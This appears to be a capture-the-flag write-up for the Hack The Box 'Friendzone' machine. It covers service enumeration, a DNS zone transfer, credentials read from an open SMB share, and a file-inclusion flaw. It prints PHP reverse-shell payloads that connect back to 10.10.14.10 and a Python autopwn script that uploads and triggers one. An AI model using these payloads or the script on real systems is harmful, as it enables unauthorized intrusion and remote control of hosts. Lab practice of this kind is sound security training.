---
layout: post
title: "HTB - Friendzone"
categories: htb
tags: linux directory_path_traversal smb autopwn
---

## Enumeration & Penetration
Using the TTL we suppose we're working with Linux.
### nmap
```text
> sudo nmap -sS --min-rate 5000 -Pn -p- --open -v -n 10.10.10.123 -oG allports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
```

Le'ts investigates the services
```
❯ nmap -sC -sV -Pn -p21,22,53,80,139,443,445 -vvv -n 10.10.10.123 -oN targeted


PORT    STATE SERVICE     REASON  VERSION
21/tcp  open  ftp         syn-ack vsftpd 3.0.3
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4/mXYmkhp2syUwYpiTjyUAVgrXhoAJ3eEP/Ch7omJh1jPHn3RQOxqvy9w4M6mTbBezspBS+hu29tO2vZBubheKRKa/POdV5Nk+A+q3BzhYWPQA+A+XTpWs3biNgI/4pPAbNDvvts+1ti+sAv47wYdp7mQysDzzqtpWxjGMW7I1SiaZncoV9L+62i+SmYugwHM0RjPt0HHor32+ZDL0hed9p2ebczZYC54RzpnD0E/qO3EE2ZI4pc7jqf/bZypnJcAFpmHNYBUYzyd7l6fsEEmvJ5EZFatcr0xzFDHRjvGz/44pekQ40ximmRqMfHy1bs2j+e39NmsNSp6kAZmNIsx
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOPI7HKY4YZ5NIzPESPIcP0tdhwt4NRep9aUbBKGmOheJuahFQmIcbGGrc+DZ5hTyGDrvlFzAZJ8coDDUKlHBjo=
|   256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF+FZS11nYcVyJgJiLrTYTIy3ia5QvE3+5898MfMtGQl
53/tcp  open  domain      syn-ack ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    syn-ack Apache httpd 2.4.29
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED/localityName=AMMAN
| Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED/localityName=AMMAN
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-10-05T21:02:30
| Not valid after:  2018-11-04T21:02:30
| MD5:   c144 1868 5e8b 468d fc7d 888b 1123 781c
| SHA-1: 88d2 e8ee 1c2c dbd3 ea55 2e5e cdd4 e94c 4c8b 9233

|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -59m59s, deviation: 1h43m55s, median: 0s
| nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FRIENDZONE<00>       Flags: <unique><active>
|   FRIENDZONE<03>       Flags: <unique><active>
|   FRIENDZONE<20>       Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 60332/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 23732/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 62124/udp): CLEAN (Failed to receive data)
|   Check 4 (port 37865/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2021-09-03T09:33:56+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-09-03T06:33:56
|_  start_date: N/A

```
For the port 443 we get a domain name 'friendzone.red'

### 21/tcp  open  ftp

### 22/tcp  open  ssh

### 53/tcp  open  domain
In this cases if you know the IP address and the domain name of a machine you can deploy a **Zone Transfer attack**
```text
IP: 10.10.10.123
Domain name: friendzone.red & friendzoneportal.red
```
```
❯ dig @10.10.10.123 friendzone.red axfr

; <<>> DiG 9.16.15-Debian <<>> @10.10.10.123 friendzone.red axfr
; (1 server found)
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 48 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: vie sep 03 10:38:20 CEST 2021
;; XFR size: 8 records (messages 1, bytes 289)

```
And we get some news subdomains available to access. Don't forget add it to the /etc/hosts file.

### http & https (80 & 443)
```text
❯ whatweb http://10.10.10.123
http://10.10.10.123 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[info@friendzoneportal.red], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.123], Title[Friend Zone Escape software]
```
And search information of the ssl certificate
`openssl s_client -connect 10.10.10.123`
Uhmm we have another domain leaked (friendzoneportal.red). Add both to the `/etc/hosts` file to go to the address using this domain and in the browser try:
`http://friendzoneportal.red` -> Return nothing interesting
and
`https://friendzoneportal.red`
![[Pasted image 20210903093823.png]]
Looks interesting. Let's keep at the moment with the https port to research depper.

Same with the other domain we get from nmap
`http://friendzone.red`
![[Pasted image 20210903112929.png]]

----
------------------------------------
###### Domain names
- whatweb
	- friendzoneportal.red
- openssl
	- friendzoneportal.red
- dns - zone transfer attack
	- administrator1.friendzone.red
	- hr.friendzone.red
	- uploads.friendzone.red.
If you investigate the each subdomain (adding previously to the /etc/host)
![[Pasted image 20210903123931.png]]
searching the code we can see a comment that tell us a path
```
<!-- Just doing some development here -->
<!-- /js/js -->
<!-- Don't go deep ;) -->
```
And we find in it:
```
>https://friendzone.red/js/js
	Testing some functions !

	I'am trying not to break things !
	cDQwNjRDUW9XaTE2MzA2NjE3NDE4dnlkajhqRXpz
```


https://adminsitrator1.friendzone.red:
![[Pasted image 20210903123829.png]]
What credentials could we try? we get them from smb service in general folder in the creds.txt file
What happend if 


https://uploads.friendzone.red
![[Pasted image 20210903125251.png]]

----

If we authenticate with the credentials in the administrator1.friendzone.red it makes us redirect to 
`https://adminsitrator1.friendzone.red/dashboard.php`
and after that folling the instructions there just add to the url the next
`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp`
![[Pasted image 20210903125943.png]]
What happend if you try the url
`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=dashboard`
?
![[Pasted image 20210903161739.png]]
We are executing files in php inside the webpage we can access! We discover a **directory path traversal**. 
###### Directory path traversal
After use a name the server is adding '.php' so to exploit this with not php files we could try
`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../../../../etc/passwd`
and its not working because it is trying to open passwd.php. try with a null byte injection
`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../../../../etc/passwd$00`
But it still don't works.

If we could upload some file we could execute php in the server... what if we try to upload through samba in the folder "Development"
```text
❯ nano first.php
❯ cat first.php
<?php echo '<p>Hola Mundo</p>'; ?>
❯ smbclient //10.10.10.123/Development -N
Try "help" to get a list of possible commands.
smb: \> put first.php
putting file first.php as \first.php (0,3 kb/s) (average 0,3 kb/s)
smb: \> 
```
![[Pasted image 20210903173654.png]]
Voilá we have RCE now just upload an php file that return a reverse shell in php
```php
<?php
  system("bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'");
?>
```
and with the `nc -nlvp 443` running we get a RShell
![[Pasted image 20210903174625.png]]
Let's treat the tty:
```text
script /dev/null -c bash
ctrl + z
stty raw -echo; fg
reset
Terminal type? xterm

export TERM=xterm
export SHELL=bash

stty size
stty rows 51 columns 189

```

------
Using Directory Path Traversal if we know the php files that exists in the folder we could get the code in base64 using wrappers
```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=login

#and the result just use base -d to get the content
```


### 445/tcp open  microsoft-ds
`crackmapexec smb 10.10.10.123`

List the information:
```
smbclient -L 10.10.10.123 -N
or
smbmap -H 10.10.10.123 -u ''
```
```text
smbmap -H 10.10.10.123 -u ''
[+] Guest session       IP: 10.10.10.123:445    Name: friendzoneportal.red                              
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
```
- general:
`smbclient //10.10.10.123/general`
and we get a creds.txt file
```text
❯ cat creds.txt
creds for the admin THING:
admin:WORKWORKHhallelujah@#
```
We have credentials but we don't know from where.
```
❯ crackmapexec smb 10.10.10.123 -u "admin" -p "WORKWORKHhallelujah@#"
SMB         10.10.10.123    445    FRIENDZONE       [*] Windows 6.1 (name:FRIENDZONE) (domain:) (signing:False) (SMBv1:True)
SMB         10.10.10.123    445    FRIENDZONE       [+] \admin:WORKWORKHhallelujah@#
```
They are valid at least for the smb service. You can try with 
- ftp -> Don't works
- ssh -> Don't works
- http -> Yo
- dns

--------
## Autopwn
To have available smb in python:
https://installlion.com/kali/kali/main/p/python3-smb/install/index.html
If we have some problems with importations:
```text
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```

Just for the penetration this script get you a bash in the remote system
```python
#!/usr/bin/python3

import pdb
import urllib3
import urllib

from smb.SMBHandler import SMBHandler

from pwn import *

def def_handler(sig, frame):

    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "https://administrator1.friendzone.red/login.php"
rce_url = "https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/reverse"
lport = 443

def getCreds():
	os.system("mkdir /mnt/general")
	os.system('mount -t cifs //10.10.10.123/general /mnt/general -o username="null",password="null",domain="WORKGROUP",rw')
	time.sleep(2)
	data = open("/mnt/general/creds.txt", "r")
	data = data.read()
	os.system("umount /mnt/general")
	time.sleep(2)
	os.system("rm -r /mnt/general")

	print(data)
	username = re.findall(r'(.*?):', data)[1]
	password = re.findall(r':(.*)', data)[1]

	return username, password

def makeRequest(username, password):
	urllib3.disable_warnings()

	s = requests.session()
	s.verify = False

	data_post = {
		'username': username,
		'password': password
	}
	r = s.post(login_url, data=data_post)

	os.system("mkdir /mnt/montura")
	os.system('mount -t cifs //10.10.10.123/Development /mnt/montura -o username="null",password="null",domain="WORKGROUP",rw')
	time.sleep(2)
	#Sustitute 10.10.14.10 for your own IP
	os.system("echo \"<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 443 >/tmp/f'); ?>\" > /mnt/montura/reverse.php")
	os.system("umount /mnt/montura")
	time.sleep(2)
	os.system("rm -r /mnt/montura")

	r = s.get(rce_url)



if __name__ == '__main__':
	
	username, password = getCreds()
	
	try:
		threading.Thread(target=makeRequest, args=(username,password)).start()
	except Exception as e:
		log.error(str(e))

	shell = listen(lport, timeout=20).wait_for_connection()

	shell.interactive()

```

## Privileges Escalation
At the moment this is empty, I reserve energies for the next iteration

tips:
```
suid
find \-perm -4000 2>/dev/null
```